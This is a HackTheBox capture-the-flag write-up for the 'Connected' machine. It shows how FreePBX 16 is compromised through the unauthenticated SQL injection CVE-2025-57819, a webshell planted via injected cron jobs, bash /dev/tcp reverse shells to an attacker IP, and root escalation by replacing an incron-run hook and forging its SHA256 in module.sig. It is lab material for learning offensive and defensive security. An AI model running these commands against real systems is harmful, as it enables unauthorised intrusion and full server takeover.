**Difficulty:** Easy
**OS:** Linux (CentOS)  
**IP:** 10.129.9.19  
**Services:** FreePBX 16.0.40.7 / Asterisk PBX  
**CVEs Exploited:** CVE-2025-57819 (Initial Access), Incron + Hook File Tampering (Privilege Escalation)

---

## Enumeration

### Nmap

Initial scan reveals a CentOS host running Apache 2.4.6, OpenSSL 1.0.2k-fips, and PHP 7.4.16. The SSL certificate CN is `pbxconnect`, strongly hinting at a PBX platform.

```
Host: 10.129.9.19
OS: CentOS (TTL 63)
Stack: Apache 2.4.6 + OpenSSL 1.0.2k-fips + PHP 7.4.16
SSL CN: pbxconnect
```

### Virtual Hosts

Adding both `devhub.htb` and `connected.htb` to `/etc/hosts`:

```bash
echo "10.129.9.19 devhub.htb connected.htb" >> /etc/hosts
```

Both resolve to the same FreePBX admin panel. All other vhost fuzzing also redirects to `connected.htb`.

### Web Enumeration

Visiting `https://connected.htb/admin/` reveals **FreePBX 16.0.40.7**. The page source contains a rotating `<div id="key">` value — this is a CSRF token tied to the session cookie (PHPSESSID), not a static API key.

```
/admin/        → FreePBX Admin Panel (16.0.40.7)
/ucp/          → User Control Panel (16.0.38.1)
/robots.txt    → Disallow: /  (standard FreePBX)
```

---

## Initial Access — CVE-2025-57819

### Vulnerability

CVE-2025-57819 is an **unauthenticated SQL injection** in FreePBX's endpoint module, exploitable via:

```
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<PAYLOAD>
```

The `brand` parameter is not sanitised before being passed to a SQL query. This allows an unauthenticated attacker to inject arbitrary SQL — including writing a webshell via a cron job inserted into the `cron_jobs` table.

### Exploit

Using the [watchTowr PoC](https://github.com/watchtowrlabs/CVE-2025-57819):

```bash
python3 poc.py -H http://connected.htb
```

The exploit:
1. Injects an `INSERT INTO cron_jobs` payload via the SQLi
2. The malicious cron job base64-decodes a PHP webshell and writes it to `/var/www/html/`
3. Waits up to 2 minutes for `fwconsole job --run` to execute the cron entry

Output:

```
[+] VULNERABLE - webshell found: 
    http://connected.htb/this-is-an-ioc-not-actually-watchTowr-wdlipc0wnd.php?cmd=hostname
[+] Cleaning malicious cron_job
```

### Upgrading to Reverse Shell

```bash
# On Kali
nc -lvnp 4444

# Via webshell
curl -sk "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-wdlipc0wnd.php" \
  --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.154/4444 0>&1'"
```

Shell received as `asterisk`.

### User Flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/asterisk/user.txt
```

---

## Privilege Escalation — Root

### Enumeration

#### Incron Configuration

`incrond` runs as root (PID 759) and watches several paths:

```bash
cat /etc/incron.d/*
```

```
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

The two `sysadmin_manager` rules are key. When a file is written to `/usr/local/asterisk/incron/`, `sysadmin_manager --local <filename>` is called **as root**. The filename is parsed as `modulename_hookname` and the corresponding hook script is executed from:

```
/var/www/html/admin/modules/<module>/hooks/<hook>
```

#### Checking Permissions

```bash
ls -la /var/www/html/admin/modules/sysadmin/
```

```
drwxrwxr-x. 16 asterisk asterisk  sysadmin/
```

The `sysadmin` module directory is **group-writable by asterisk**. While `hooks/` itself is `drwxr-xr-x`, `module.sig` — the SHA256 signature file checked before execution — is also writable:

```
-rw-rw-r--. asterisk asterisk  module.sig
```

### The Exploit

The `sysadmin_manager` verifies hook integrity by comparing SHA256 hashes in `module.sig` against the actual hook files. Since both the hook file and `module.sig` are writable by `asterisk`, we can:

1. Overwrite a hook file with a reverse shell payload
2. Recompute the SHA256 and update `module.sig`
3. Trigger the incron rule by writing to `/usr/local/asterisk/incron/`

Choosing the `poweroff` hook (small and simple):

```bash
# Step 1 — Write malicious hook
cat > /tmp/evil_hook << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.154/4446 0>&1
EOF
chmod +x /tmp/evil_hook

# Step 2 — Compute new hash
NEW_HASH=$(sha256sum /tmp/evil_hook | awk '{print $1}')

# Step 3 — Get old hash from module.sig
OLD_HASH=$(grep "hooks/poweroff" /var/www/html/admin/modules/sysadmin/module.sig | awk '{print $3}')

# Step 4 — Replace hook and update signature
cp /tmp/evil_hook /var/www/html/admin/modules/sysadmin/hooks/poweroff
sed -i "s/$OLD_HASH/$NEW_HASH/" /var/www/html/admin/modules/sysadmin/module.sig

# Step 5 — Start listener on Kali
# nc -lvnp 4446

# Step 6 — Trigger via incron (runs sysadmin_manager as root)
echo "" > /usr/local/asterisk/incron/sysadmin_poweroff
```

Root shell received on port 4446.

### Root Flag

```bash
id && cat /root/root.txt
```

```
uid=0(root) gid=0(root) groups=0(root)
<flag>
```

---

## Summary

| Step | Detail |
|------|--------|
| **Recon** | FreePBX 16.0.40.7 on Apache/CentOS |
| **Initial Access** | CVE-2025-57819 — unauthenticated SQLi → webshell via `cron_jobs` injection |
| **Shell** | Webshell upgraded to reverse shell as `asterisk` |
| **Privesc** | `sysadmin_manager` incron hook + writable `module.sig` → overwrite hook → root shell |
| **Root Vector** | Tampered `sysadmin/hooks/poweroff` + updated SHA256 in `module.sig`, triggered via `/usr/local/asterisk/incron/sysadmin_poweroff` |

---

## Key Takeaways

- **CVE-2025-57819** demonstrates how a single unauthenticated SQLi in a cron management endpoint can lead directly to code execution — no credentials required.
- **Incron + signature bypass**: The privilege escalation relies on a logic flaw where both the hook script *and* the integrity check file (`module.sig`) are writable by the same low-privilege user. Verifying file integrity only works if the signature store itself is protected.
- **Writable parent directories** are a common source of escalation — even if a file has strict permissions, a writable parent allows replacement.

---

*HackTheBox — Connected | Writeup by [your handle]*
